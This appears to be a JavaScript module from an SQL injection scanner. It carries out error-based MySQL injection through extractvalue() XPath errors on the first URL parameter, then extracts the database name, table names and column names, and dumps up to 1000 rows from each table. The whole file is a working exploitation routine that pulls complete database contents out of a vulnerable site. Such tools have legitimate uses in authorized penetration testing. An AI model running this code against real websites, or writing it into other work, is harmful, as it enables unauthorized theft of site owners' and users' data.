import { printInfo, printSuccess } from "./logger.js";
import { sendRequest } from "./http.js";
import { cleanUpFatal, mutateQuery } from "./helper.js";
import { dbSaveColName, dbSaveDbName, dbSaveTblName, dbSaveVulnerability, dbSaveRowDump } from "./database.js";

export async function testMySql(setting) {
	printInfo("Running MYSQL test suite");

	const query = setting.urlQuery;
	const firstParamsName = [...query.keys()][0];
	const firstParamsValue = query.get(firstParamsName);
	const c = setting.contextChar;

	const dbNameId = await getDatabaseName(setting, query, firstParamsName, firstParamsValue, c);
	const tblList = await getTblName(setting, query, firstParamsName, firstParamsValue, c, dbNameId);
	await getColumnName(setting, query, firstParamsName, firstParamsValue, c, tblList);
	await dumpRows(setting, query, firstParamsName, firstParamsValue, c, tblList);
}

async function getDatabaseName(setting, query, name, valueBase, c) {
	const { value, payload } = await extractString(setting, query, name, valueBase, c, "SELECT database()");
	if (value === null || value.length === 0) {
		cleanUpFatal(setting.db, `Fail to get database name`);
	}
	printSuccess(`Database name: ${value}`);

	dbSaveVulnerability(setting.db, setting.scanId, name, payload, "error");
	const dbNameId = dbSaveDbName(setting.db, setting.scanId, value);

	return dbNameId;
}

async function getTblName(setting, query, name, valueBase, c, dbNameId) {
	const subquery = "SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()";
	const { value, payload } = await extractString(setting, query, name, valueBase, c, subquery);
	if (value === null || value.length === 0) {
		cleanUpFatal(setting.db, `Fail to get table list`);
	}
	const tblNames = value.split(",");
	printSuccess(`Database tables: ${tblNames}`);

	dbSaveVulnerability(setting.db, setting.scanId, name, payload, "error");
	const tblList = [];
	for (const tblName of tblNames) {
		const tblNameId = dbSaveTblName(setting.db, dbNameId, tblName);
		tblList.push({ tblNameId, tblName });
	}

	return tblList;
}

async function getColumnName(setting, query, name, valueBase, c, tblList) {
	for (const table of tblList) {
		const subquery = `SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='${table.tblName}'`;
		const { value, payload } = await extractString(setting, query, name, valueBase, c, subquery);
		if (value === null || value.length === 0) {
			cleanUpFatal(setting.db, `Fail to get column list`);
		}
		const colNames = value.split(",");
		printSuccess(`Table ${table.tblName} columns: ${colNames}`);

		dbSaveVulnerability(setting.db, setting.scanId, name, payload, "error");
		table.columns = colNames;
		for (const colName of colNames) {
			dbSaveColName(setting.db, table.tblNameId, colName);
		}
	}
}

const ROW_SEP = "~|~";
const MAX_ROWS = 1000;

async function dumpRows(setting, query, name, valueBase, c, tblList) {
	for (const table of tblList) {
		if (!table.columns || table.columns.length === 0) {
			continue;
		}

		const rowExpr = table.columns
			.map((col) => `IFNULL(CAST(\`${col}\` AS CHAR),'NULL')`)
			.join(`,'${ROW_SEP}',`);

		for (let rowIndex = 0; rowIndex < MAX_ROWS; rowIndex++) {
			const subquery = `SELECT CONCAT(${rowExpr}) FROM \`${table.tblName}\` LIMIT 1 OFFSET ${rowIndex}`;
			const { value, payload } = await extractString(setting, query, name, valueBase, c, subquery);
			if (value === null) {
				break;
			}

			const values = value.split(ROW_SEP);
			const row = {};
			table.columns.forEach((col, i) => { row[col] = values[i] ?? null; });
			const data = JSON.stringify(row);
			printSuccess(`Table ${table.tblName} row ${rowIndex}: ${data}`);

			if (rowIndex === 0) {
				dbSaveVulnerability(setting.db, setting.scanId, name, payload, "error");
			}
			dbSaveRowDump(setting.db, table.tblNameId, rowIndex, data);
		}
	}
}

const CHUNK = 31;

async function extractString(setting, query, name, valueBase, c, expr) {
	let value = "";
	let firstPayload = null;

	for (let offset = 1; ; offset += CHUNK) {
		const injection = ` AND extractvalue(1,concat(0x7e,MID((${expr}),${offset},${CHUNK})))-- 42`;
		const payload = `${valueBase}${c}${injection}`;
		if (firstPayload === null) {
			firstPayload = payload;
		}
		const params = mutateQuery(query, name, payload);
		const res = await sendRequest(setting, params);
		const chunk = parseError(res.body);

		if (chunk === null) {
			if (offset === 1) {
				return { value: null, payload: firstPayload };
			}
			break;
		}

		value += chunk;
		if (chunk.length < CHUNK) {
			break;
		}
	}

	return { value, payload: firstPayload };
}

function parseError(body) {
	const marker = "XPATH syntax error: '~";
	const start = body.indexOf(marker);
	if (start === -1) {
		return null;
	}
	const rest = body.slice(start + marker.length);
	const end = rest.lastIndexOf("'");
	return end === -1 ? null : rest.slice(0, end);
}
